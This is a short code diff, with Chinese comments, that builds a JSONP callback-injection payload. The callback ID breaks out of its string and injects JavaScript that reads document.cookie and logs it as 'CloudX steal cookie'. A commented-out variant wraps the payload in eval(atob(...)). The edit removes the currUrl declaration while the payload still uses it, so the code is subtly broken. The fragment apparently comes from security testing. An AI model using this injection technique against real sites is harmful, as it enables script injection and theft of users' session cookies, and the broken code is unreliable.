@@ -321,10 +321,10 @@
 
 
         // 要注入的代码（移除内部重复的 payload 声明）
-        const payload = "console.log('cloud:'+document.cookie);const currUrl = location.href;if (!location.href.startsWith(currUrl) && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}";
+        const payload = "console.log('cloud:'+document.cookie);if (!location.href.startsWith(currUrl) && !window.__cloudx_called) {window.__cloudx_called = true;console.info('CloudX steal cookie : ' + document.cookie);}";
         // const base64Code = btoa(payload);
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
-        
+
 // 修正：1. 模板字符串用反引号 2. 不立即 eval，而是拼接 Base64 字符串（或解码后的字符串）
 // 场景1：拼接 Base64 编码后的字符串
 //         const callbackId = `${service}${genCallbackId()}');` + `eval(atob("${base64Code}"));//`;
